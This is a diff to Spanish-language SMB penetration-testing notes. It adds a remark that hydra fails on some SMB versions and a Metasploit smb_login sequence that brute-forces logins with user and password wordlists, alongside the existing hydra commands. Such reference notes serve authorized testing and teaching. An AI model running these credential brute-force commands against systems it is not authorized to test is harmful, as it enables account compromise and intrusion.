@@ -34,9 +34,23 @@ nmap -p445 --script smb-enum-users <IP>
 
 ### Obtención de credenciales
 
+**Con hydra**
+
+No funciona en todas las versiones de SMB.
+
 ```bash
 hydra -l <USR> -P <PASS_WORDLIST> <IP> <SERVICE>
 hydra -L <USR_WORDLIST> -P <PASS_WORDLIST> <IP> <SERVICE>
+```
+
+**Con metasploit**
+
+```bash
+msf > use auxiliary/scanner/smb/smb_login
+msf auxiliary(scanner/smb/smb_login) > set rhosts <IP>
+msf auxiliary(scanner/smb/smb_login) > set user_file <usr_wordlist>
+msf auxiliary(scanner/smb/smb_login) > set pass_file <pass_wordlist>
+msf auxiliary(scanner/smb/smb_login) > run
 ```
 
 ### Enumeración de recursos compartidos
